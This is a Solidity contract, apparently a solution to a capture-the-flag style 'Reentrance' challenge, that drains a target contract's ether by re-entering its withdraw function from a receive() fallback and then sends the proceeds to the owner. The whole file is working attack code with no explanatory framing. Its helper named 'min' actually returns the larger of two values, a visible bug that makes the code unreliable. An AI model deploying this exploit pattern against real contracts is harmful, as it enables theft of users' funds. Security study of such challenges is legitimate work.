// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "./Reentrance.sol";

contract ReentranceExploit{

    modifier onlyOwner(){
        require(msg.sender == owner, "Caller is not the owner");
        _; //Continue Execution
    }

    IReentrance reentrance;
    address owner;
    

    constructor(address payable _reentranceAddr) public{
        reentrance = IReentrance(_reentranceAddr);
        owner = msg.sender;

    }
    function exploit() public payable onlyOwner{
        reentrance.donate{value: msg.value}(address(this));
        reentrance.withdraw(reentrance.balanceOf(address(this)));
    }
    function withdraw() public payable onlyOwner{
        (bool success, ) = msg.sender.call{value:address(this).balance}("");
        require(success, "Withdrawal failed");
    }
    receive() external payable{
        uint _amount = min(reentrance.balanceOf(address(this)), address(reentrance).balance);
        if (_amount > 0){
            reentrance.withdraw(_amount);
        }
        
    }
    function min(uint _a, uint _b) private pure returns (uint){
        return _a >= _b ? _a:_b;
    }

}